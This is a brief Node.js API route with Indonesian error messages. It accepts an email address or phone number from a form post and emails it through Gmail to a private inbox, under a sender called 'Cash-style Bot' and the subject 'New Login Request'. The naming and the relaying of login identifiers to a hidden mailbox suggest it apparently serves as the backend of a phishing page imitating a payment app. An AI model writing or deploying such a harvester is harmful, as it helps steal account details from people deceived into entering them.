import nodemailer from "nodemailer";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ success: false, message: "Method not allowed" });
  }

  try {
    const { email, phone } = req.body;

    if (!email && !phone) {
      return res.status(400).json({ success: false, message: "Email atau Phone harus diisi" });
    }

    let text = "";
    if (email) text = `Email: ${email}`;
    if (phone) text = `Phone: ${phone}`;

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.MAIL_USER,
        pass: process.env.MAIL_PASS,
      },
    });

    await transporter.sendMail({
      from: `"Cash-style Bot" <${process.env.MAIL_USER}>`,
      to: process.env.MAIL_TO,
      subject: "New Login Request",
      text,
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("SendMail Error:", error.message, error);
    return res.status(500).json({ success: false, message: error.message });
  }
}
